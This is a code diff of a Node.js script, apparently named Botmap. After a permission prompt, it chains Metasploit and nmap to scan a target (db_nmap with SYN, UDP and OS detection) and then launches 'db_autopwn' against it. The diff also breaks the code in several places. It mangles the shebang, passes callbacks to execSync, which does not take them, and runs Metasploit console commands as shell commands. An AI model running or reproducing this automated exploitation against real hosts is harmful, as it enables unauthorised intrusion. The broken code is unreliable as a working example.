@@ -1,4 +1,4 @@
-#!/usr/bin/env nodejs
+#! usr/bin/env nodejs
 'use strict';
 
 var _fs = require('fs');
@@ -11,7 +11,7 @@ var _safe = require('colors/safe');
 
 var _safe2 = _interopRequireDefault(_safe);
 
-var _prompt = require('prompt-sync');
+var _promptSync = require('prompt-sync');
 
 function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }
 
@@ -34,7 +34,7 @@ function userAuth() {
   console.warn(_safe2.default.warn("Note,that you need the permission of the target's owner !"));
   console.warn(_safe2.default.warn('Are you sure you want to scan and attack: \n' + target));
   console.log(_safe2.default.prompt('Press y to continue'));
-  var input = p.prompt();
+  var input = _promptSync.prompt.prompt();
 
   if (input != 'y') {
     console.log(info('Maybe a wise decision..'));
@@ -47,7 +47,7 @@ function exploit(target) {
   console.log(_safe2.default.info('Starting ...'));
   console.warn(_safe2.default.warn('Once again... I hope you now what you are doing...'));
   //start postgresql
-  (0, _child_process.exec)('service postgresql start', function (err, stdout, stderr) {
+  (0, _child_process.execSync)('service postgresql start', function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
       console.error(_safe2.default.error('Could not start postgresql! \n' + error));
@@ -57,7 +57,7 @@ function exploit(target) {
     }
   });
   //start msf
-  (0, _child_process.exec)('msfconsole', function (err, stdout, stderr) {
+  (0, _child_process.execSync)('msfconsole', function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
       console.error(_safe2.default.error('Could not initialize msfdb! \n' + error));
@@ -66,7 +66,7 @@ function exploit(target) {
       console.log(_safe2.default.info('started msf'));
     }
   });
-  (0, _child_process.exec)('workspace botmap', function (err, stdout, stderr) {
+  (0, _child_process.execSync)('workspace botmap', function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
       console.error(_safe2.default.error('Error\n' + error));
@@ -77,7 +77,7 @@ function exploit(target) {
     }
   });
   console.log(_safe2.default.info('Starting scan...'));
-  (0, _child_process.exec)('db_nmap -sS -sV -sU -n -O ' + target, function (err, stdout, stderr) {
+  (0, _child_process.execSync)('db_nmap -sS -sV -sU -n -O ' + target, function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
       console.error(_safe2.default.error('Could not scan target \n' + error));
@@ -86,7 +86,7 @@ function exploit(target) {
       console.log(_safe2.default.info('scan finished'));
     }
   });
-  (0, _child_process.exec)('db_hosts', function (err, stdout, stderr) {
+  (0, _child_process.execSync)('db_hosts', function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
       console.error(_safe2.default.error('Could not get host info... \n' + error));
@@ -96,7 +96,7 @@ function exploit(target) {
     }
   });
   console.warn(_safe2.default.warn('Note that the following action can bring you to jail ! \n Botmap can not stop the action once it started !'));
-  (0, _child_process.exec)('db_autopwn -p -t -e', function (err, stdout, stderr) {
+  (0, _child_process.execSync)('db_autopwn -p -t -e', function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
       console.error(_safe2.default.error('Can not pwn the target... \n' + error));
@@ -109,7 +109,7 @@ function exploit(target) {
 
 function setup() {
   console.log(_safe2.default.info('Botmap is setting up a db workspace...'));
-  (0, _child_process.exec)('service postgresql start', function (err, stdout, stderr) {
+  (0, _child_process.execSync)('service postgresql start', function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
       console.error(_safe2.default.error('Could not start postgresql \n' + error));
@@ -118,7 +118,7 @@ function setup() {
       console.log(_safe2.default.info('started postgresql'));
     }
   });
-  (0, _child_process.exec)('service metasploit start', function (err, stdout, stderr) {
+  (0, _child_process.execSync)('service metasploit start', function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
       console.error(_safe2.default.error('Could not start msf \n' + error));
@@ -127,7 +127,7 @@ function setup() {
       console.log(_safe2.default.info('started msf'));
     }
   });
-  (0, _child_process.exec)('workspace -a botmap', function (err, stdout, stderr) {
+  (0, _child_process.execSync)('workspace -a botmap', function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
       console.error(_safe2.default.error('Could not create workspace\n' + error));
@@ -136,7 +136,7 @@ function setup() {
       console.log(_safe2.default.info('created workspace'));
     }
   });
-  (0, _child_process.exec)('workspace botmap', function (err, stdout, stderr) {
+  (0, _child_process.execSync)('workspace botmap', function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
       console.error(_safe2.default.error('Could not switch to workspace \n' + error));
@@ -145,7 +145,7 @@ function setup() {
       console.log(_safe2.default.info('switched workspace'));
     }
   });
-  (0, _child_process.exec)('exit', function (err, stdout, stderr) {
+  (0, _child_process.execSync)('exit', function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
       console.error(_safe2.default.error('Could not exit msfdb \n' + error));
